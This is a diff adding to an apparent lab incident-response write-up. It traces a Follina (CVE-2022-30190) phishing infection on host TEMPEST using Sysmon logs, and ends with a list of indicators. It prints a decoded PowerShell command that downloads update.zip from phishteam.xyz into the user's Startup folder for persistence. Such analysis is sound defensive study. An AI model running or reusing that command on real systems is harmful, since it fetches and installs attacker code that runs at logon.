@@ -28,10 +28,49 @@ Write Up
 Reasoning: The 2 information we know is that the user downloaded a malicious document from chrome. Thus, the whole event starts with chrome. Lets look at all the chrome related events by typing
 chrome in Sysmon View and Timeline Explorer.
 
+As standard practice, we should always check the hash of the artifacts.
+![hashcheck](images/Tempest_01.png)
+
+Since every thing starts with chrome, lets check what we can find with chrome regardless of the questions. Below shows an image where we can start to understand the incident and construct the
+and IOCs.
+
+![first interaction](images/Tempest_02.png)
+
+The incident started at 2022-06-20 17:12:57, where the user benimaru using the machine TEMPEST visited the domain phishteam.xyz with the IP:167.71.199.191. At 2022-06-20 17:12:58, a malicious word 
+document free_magicules.doc was downloaded to the location: C:\Users\benimaru\Downloads.
+
+Next, lets search for any related events related to free_magicules.doc.
+
+![free_magicules.doc](images/Tempest_03.png)
+
+and we found that the document was opened at 17:13:12 with a PID: 496. Now lets have a look at the same stuff in sysmon view.
+
+![initialc2 connection](images/Tempest_04.png)
+
+looking at the image, we see that the file was executed successfully and registry event has changed. We can check what process and commands was created after the word is executed by looking at
+events around that time as well as finding a PPID: 496 (process spawn by the doc).
+
+![interesting command](images/Tempest_05.png)
+
+Looking at the command there is a very long base64 string which is executed by the msdt.exe (17:13:35), which is associated with CVE-2022-30190. After decoding it, it is `$app=Environment]::GetFolderPath('ApplicationData');cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;`
+
+With this command, we know that a new file was downloaded. Lets check all the events related to update.zip.
+![download location](images/Tempest_06.png)
+
+It was downloaded to 'C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.
+
+The files in startup folder will be executed as a user logon to the machine, after searching, on successful logon, the event 4624 will be logged to windows event logs. lets look at what a logon 
+event around/after that time. As well as having a sysmon event ID 1 process creation.
+![logon](images/Tempest_07.png)
+
+
+
 
 
 **IOC List**
-- 
+- Domain Name: phishteam.xyz (IP: 167.71.199.191)
+- free_magicules.doc
+- update.zip
 
 
 
